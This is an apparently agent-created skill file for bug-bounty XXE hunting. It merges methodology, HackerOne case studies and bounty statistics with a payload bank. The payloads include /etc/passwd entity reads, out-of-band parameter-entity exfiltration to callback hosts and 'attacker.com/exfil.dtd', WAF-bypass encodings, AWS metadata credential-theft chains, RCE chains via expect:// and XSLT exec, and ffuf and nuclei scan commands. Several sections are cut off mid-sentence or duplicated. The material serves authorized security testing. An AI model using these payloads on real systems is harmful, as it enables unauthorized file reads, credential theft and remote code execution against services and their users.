---
name: bbhunt-xxe
description: "Use for XML/SOAP/SAML/SVG/DOCX parsers that resolve external entities or allow local file inclusion. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# XML External Entity and Parser Flaws — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (42 valid reports, 9 paid / 21%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| XML / SOAP / SAML / XXE | 22 |
| encoding / double-encode / null byte | 12 |
| Content-Type / body-format switch | 8 |
| file upload / filename / extension | 8 |
| header injection (Host / X-Forwarded / etc.) | 8 |
| admin / privileged-role context | 6 |
| internal service / port / container | 6 |
| second-order / stored / blind delivery | 6 |
| subdomain / DNS / cert-transparency recon | 5 |
| parser confusion / normalization | 5 |

### Parameters observed

`version`, `encoding`, `type`, `debug`, `max-age`, `pct`, `rua`, `reproduce`, `username`, `password`, `referenceid`, `code`, `message`, `read`, `resource`

### Case studies (real reports, paid and unpaid)

- [347139](https://hackerone.com/reports/347139) Rockstar Games — LFI and SSRF via XXE in emblem editor ($1500, critical)
- [500515](https://hackerone.com/reports/500515) Starbucks — XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx (no bounty — still valid, critical)
- [248668](https://hackerone.com/reports/248668) X / xAI — XXE on sms-be-vip.twitter.com in SXMP Processor (no bounty — still valid, medium)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Identify every XML-consuming surface, including file imports and third-party integrations.
2. Confirm entity resolution with a harmless local file or controlled callback; do not request sensitive files unnecessarily.
3. Classify the oracle: in-band echo, error-based, blind/OOB, or file-write via xslt/zip.
4. Test billion-laughs only where permitted — prefer a single entity for proof.
5. For SAML, test signature/entity handling carefully and coordinate with platform-specific checks.
6. Prove impact: file read with unique content, internal service reachability, or authentication effect.

### Signals

- XML request bodies, SOAP services, SAML assertions, SVG/DOCX/XLSX uploads
- Parser errors mentioning entity or DTD
- A response that echoes entity content

### Kill criteria

- Parser has DTD/external entities disabled at every entry point.
- No observable result from entity resolution.
- Only a DoS-style expansion with no other consequence.

### Escalation chains

- XXE -> SSRF -> metadata.
- XXE -> local file read -> credentials -> further access.

### Veteran tip

Parser differences between endpoints in the same app are common — test each XML entry point separately.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Find XML parsers: SOAP, SAML, RSS, SVG, office docs, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when entities are blocked.
- Check SAML signature handling for XML signature wrapping.

### Deeper checklist

- Find XML parsers: SOAP, SAML, RSS, SVG, office documents, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when direct entities are blocked.
- Check SAML signature handling for XML signature wrapping.
- Read a harmless file or trigger a callback as proof.

### Step-by-Step Hunting Methodology

1. **Map every XML entry point** — Use Burp Suite passive scanner to flag all requests/responses with XML content types. Also intercept JSON endpoints and manually swap `Content-Type` to `application/xml` with equivalent XML body.

2. **Identify file upload features** — Upload SVG, DOCX, XLSX, and observe if the server processes/renders content. These are often XML under the hood.

3. **Attempt inline XXE (classic file read)** — Replace the XML body with a basic entity test payload targeting `/etc/passwd` or `C:\Windows\win.ini`. Observe if the value is reflected in the response.

4. **If no reflection, pivot to Blind OOB** — Set up an OOB listener (Burp Collaborator, interactsh, or a self-hosted netcat server). Inject an external entity pointing to your callback URL. Confirm DNS/HTTP hit to validate the parser is making outbound connections.

5. **Escalate Blind OOB to file exfiltration** — Use a two-stage payload: first entity loads local file, second entity sends it OOB via HTTP parameter or DNS exfiltration.

6. **Test SSRF pivot** — Point the external entity at internal network addresses (`http://169.254.169.254/latest/meta-data/`, `http://10.0.0.1/`, `http://localhost:8080/admin`). Look for differences in response timing or error messages.

7. **Test all subdomains sharing the same backend** — If one subdomain is vulnerable, enumerate and test all others systematically. Shared backend infrastructure means shared vulnerability.

8. **Test parameter-level injection** — Some endpoints parse only specific XML nodes. Inject entities in

### A. Discovery checklist — concrete places, params, headers, file types to look

- Map every XML entry point: `/api/v*/xml`, `/upload`, `/import`, `/parse`, `/convert`, `/saml/acs`, `/sso/saml`, `/feed`, `/rss`, `/soap/*`, `/wsdl`, `/service.asmx`, `/xmlrpc`.
- Test JSON endpoints by swapping `Content-Type` to `application/xml` / `text/xml` with an equivalent XML body — hidden XML parsers are a recurring source of high-value findings.
- File-upload surfaces that are XML inside a container: SVG, DOCX, XLSX, PPTX, ODT, GPX, KML, `.xml` configs, SOAP attachments, and PDFs (iText CVE-2017-9096, 2025 writeups).
- Office-doc specifics: modify `word/document.xml`, `ppt/slides/slide1.xml`, or `xl/worksheets/sheet1.xml` inside the ZIP; an XLSX needs all five boilerplate parts (`[Content_Types].xml`, `.rels`, `workbook.xml`, `workbook.xml.rels`, `sheet1.xml`) or the parser rejects it before entity processing.
- Hidden attack surface per PortSwigger: XInclude (`<xi:include href=...>`) when `DOCTYPE` is blocked, file-upload XXE, and `Content-Type`-converted XXE.
- Error-message channels matter as much as reflection: verbose Java/JDOM/Xerces, Spring, and `SAML exception:` / `Error creating JDOM document from XML string:` strings turn parser errors into an exfiltration channel.
- WAF signal: Imperva and others blocking the literal word `DOCTYPE` anywhere in a POST body — confirm the block, then look for a parser path where the DTD is inside a ZIP/XML part rather than the raw body.
- 2025-2026 real targets: Akamai CloudTest CVE-2025-49493 (SOAP/WSDL, Java 1.8), NASA unauth SAML XXE (Bug

### Signals and surfaces

### Signal

- Reports: **64** · paid: **11**
- Median bounty **$1,000** · p90 **$2,500** · max **$6,000** · total **$17,600**
- Median upvotes **24**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 9 | $8,800 | 451 |
| Pornhub | 2 | $2,500 | 228 |
| Open-Xchange | 1 | $2,000 | 86 |
| GitHub Security Lab | 2 | $1,800 | 10 |
| Rockstar Games | 1 | $1,500 | 79 |
| Uber | 2 | $500 | 67 |
| VK.com | 1 | $500 | 18 |
| Informatica | 8 | $0 | 275 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`xml` `soap` `saml` `svg` `docx` `xlsx` `import` `feed` `rss`

### Crown Jewel Targets

XXE is a critical-severity vulnerability that consistently pays at the top of bug bounty scales ($5,000–$30,000+) due to its direct path to sensitive data exfiltration and SSRF. Highest-value targets:

- **Large enterprise platforms** with XML-heavy backend integrations (finance, logistics, ride-sharing APIs)
- **Domains with file-read capability** — `/etc/passwd`, `/etc/shadow`, internal config files, AWS metadata endpoints
- **Subdomains sharing backend infrastructure** — one XXE endpoint can pivot to internal services across dozens of domains (as demonstrated by 26+ Uber domains via a single entry point)
- **API gateways** accepting XML content types — especially REST APIs that silently accept `Content-Type: application/xml`
- **File upload features** — SVG, DOCX, XLSX, PDF, PPTX parsers on the server side
- **SAML/SSO endpoints** — SAML assertions are XML-based and frequently vulnerable
- **Office/document processing services** — any feature that converts or processes user-supplied documents

---

### Tech Stack Signals

- **Java stacks**: Spring, Struts, JAX-WS — default XML parsers (SAX, DOM) are XXE-vulnerable without explicit hardening
- **PHP**: `simplexml_load_string()`, `DOMDocument::loadXML()` — vulnerable by default pre-PHP 8
- **Python**: `lxml`, `xml.etree` (safe by default), `xml.sax` (unsafe)
- **Ruby**: `Nokogiri` older versions, `REXML`
- **Node.js**: `xml2js`, `libxmljs`, `fast-xml-parser` (older versions)
- **WSDL/SOAP services**: Always test — legacy XML parsing virtually guaranteed
- **File parsers**: Apache POI (Java), python-docx, LibreOffice integrations

---

### Techniques, payloads and bypasses

### Payloads & probes

- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`
- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`
- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`

### Payload bank

**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Filter bypass

```text
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)

### Bypass tricks

- Use UTF-16/UTF-7 encodings to bypass naive filters.
- Parameter entities and external DTDs when general entities are disabled.
- Error-based extraction when output is not reflected.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** — `#500515` · Starbucks · $0 · ▲319
  > POST /retail/hxpublic v6/hxdynamicpage6.aspx? hxpage=tempfiles/temp uploaded d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max file size kb=1024&allow file type list=xml;jpg;jpeg;png;bmp;
- **XXE on sms-be-vip.twitter.com in SXMP Processor** — `#248668` · X / xAI · $0 · ▲258
  > In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.
- **XXE on https://duckduckgo.com** — `#483774` · DuckDuckGo · $0 · ▲218
  > An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on https://duckduckgo.com via `u` parameter.
- **Partial bypass of #483774 with Blind XXE on https://duckduckgo.com** — `#486732` · DuckDuckGo · $0 · ▲159
  > Blind XXE leads to `dos` and `blind injection`.
- **DMARC  Not found for paragonie.com   URGENT** — `#179828` · Paragon Initiative Enterprises · $0 · ▲147
  > "v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com"
- **XXE through injection of a payload in the XMP metadata of a JPEG file** — `#836877` · Informatica · $0 · ▲138
  > Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.
- **XXE in Site Audit function exposing file and directory

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |
| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |
| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |
| 2× | `%eval` |
| 2× | `Content-Type: application/xml;charset=UTF-8` |
| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |
| 2× | `<!DOCTYPE foo [` |
| 2× | `<params>` |
| 2× | `<offset>0</offset>` |
| 2× | `<queryParams>` |
| 2× | `<query>&xxe;</query>` |
| 2× | `<sortBy>relevance</sortBy>` |
| 2× | `<fieldList>["id", "title"]</fieldList>` |
| 2× | `</queryParams>` |
| 2× | `<source>marketplace</source>` |
| 2× | `<rows>5</rows>` |
| 2× | `</params>` |
| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |
| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |
| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |

_...and 4 more sections in `references/unified-method.md`._

### Validation and proof

### Parameter entities / OOB

```text
<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
```

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   - Can you show the contents of `/etc/passwd` or `win.ini` in the response? OR can you demonstrate a confirmed OOB callback with a file's contents transmitted to your server? OR can you reach an internal SSRF endpoint (metadata, internal admin)?

2. **What does the victim LOSE?**
   - Specific sensitive data must be identified: internal credentials, AWS IAM keys, application config files with DB passwords, PII, or internal network topology. "Parser made a DNS request" alone is insufficient — escalate to demonstrate actual data exposure or internal access.

3. **Can it be reproduced in 10 minutes from scratch?**
   - You must have a single `curl` command or Burp repeater request that a triage engineer can run against the live target and see the impact within 10 minutes, with zero ambiguity about the vulnerable parameter and endpoint.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A lone Collaborator DNS hit proves the parser fetches external entities; it is Informational/Low on its own. Escalate to actual file contents, a metadata JSON response, or internal HTTP access before claiming Critical.
- A blank reflection is usually a parse failure (illegal characters in the entity), not a missing file — retry with `/etc/hostname` or a base64 filter.
- For in-band reads, require a fingerprintable marker: `root:x:0:0:` in `/etc/passwd`, or base64 that decodes to recognizable source. Truncated base64 that still decodes is acceptable — report exactly what was recovered.
- Error-based reads must show the actual file content in the exception text, not just "file not found"; repeat with two different files to prove the channel is data-dependent.
- Distinguish parser hardening from a filter: if inline `&hello;` fails, the parser is hardened; if it succeeds but `SYSTEM` is blocked, an application filter is likely and encoding/entity tricks may work.
- Confirm OOB interactions are unique per sink by using a distinct Collaborator subdomain per parameter; delayed callbacks require polling for 30-120s.
- XInclude is a separate primitive — if `DOCTYPE` is rejected, try `<xi:include href="file:///etc/passwd" parse="text"/>` before concluding no XXE.
- 10-minute reproducibility: a single curl/Burp request that returns real file content or a confirmed internal HTTP response. A stack trace alone is not sufficient impact for a high severity.

**Entity-mechanics cheat sheet (why each payload works):*

### Blind OOB — DNS/HTTP Callback

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR.BURPCOLLABORATOR.net/xxe-test">
]>
<root><data>&xxe;</data></root>
```

_...and 3 more sections in `references/unified-method.md`._

### Escalation and related chains

### Escalation chains

- XXE -> file read -> creds.
- XXE -> SSRF -> metadata.
- SAML wrapping -> admin.

### Related Skills & Chains

- **`ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indirection that makes b

### Related Skills & Chains

- **`hunt-ssrf`** — XXE is SSRF-with-XML-syntax once you discover the parser fetches external entities. Chain primitive: blind XXE OOB `<!ENTITY % x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role">` → exfil AWS IMDS creds via parameter-entity DTD callback → STS AssumeRole chain. Where pure SSRF is filter-blocked, `gopher://` via XXE-in-`libxml2` can still reach Redis/SMTP.
- **`hunt-file-upload`** — XXE most often hides inside file-upload features that quietly parse XML (DOCX/XLSX/PPTX, SVG, GPX, KML, OOXML, SOAP attachments). Chain primitive: upload DOCX with malicious `[Content_Types].xml` containing parameter-entity DTD → OOB file read of `/etc/passwd` / `web.config` / `.aws/credentials` via the document parser running server-side.
- **`hunt-rce`** — XXE → RCE is rare but real on PHP (`expect://`), Java (XSLT extensions with `<xsl:script>`/Xalan), and older XmlSpy/SAXON deployments. Chain primitive: XXE in a Java endpoint using a vulnerable XSLT processor → `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` → RCE; or PHP XXE with `expect://id` stream wrapper enabled → direct RCE.
- **`hunt-sharepoint`** — On-prem SharePoint/Exchange/IIS stacks have a long history of XXE in SOAP/CSOM/EWS endpoints. Chain primitive: anonymous XXE in `_vti_bin/*.asmx` or EWS SOAP → read `web.config` → recover `<machineKey>` → ViewState deserialization → RCE (the ToolShell-adjacent precondition).
- **`security-arsenal`** — Reach for the XXE payload tree: standard SYSTEM file read, parameter-entity OOB DTD pattern (the `%` indi

### Tools and wordlists

### Tools

`Burp` · `xxe-exploit` · `interactsh` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |
| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Point at XML/SOAP/SAML/SVG/office upload endpoints.

```sh
nuclei -u https://target -tags xxe \
       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \
       -rl 40 -o nuclei_xxe_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xxe_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep Patterns for Source Code Review

```bash
# PHP
grep -rn "simplexml_load_string\|DOMDocument\|xml_parse\|loadXML\|SimpleXMLElement" .

# Java
grep -rn "DocumentBuilder\|SAXParser\|XMLReader\|XMLInputFactory\|TransformerFactory" .

# Python
grep -rn "lxml\|xml.sax\|parseString\|fromstring\|etree.parse" .

# Look for missing hardening
grep -rn "FEATURE_EXTERNAL_GENERAL_ENTITIES\|setExpandEntityReferences\|setFeature.*false" .
```

---

## Source skills merged into this topic

- `h1skills` — `hackerone-xxe`
- `hunting` — `xxe`
- `cbh` — `hunt-xxe`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 4 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
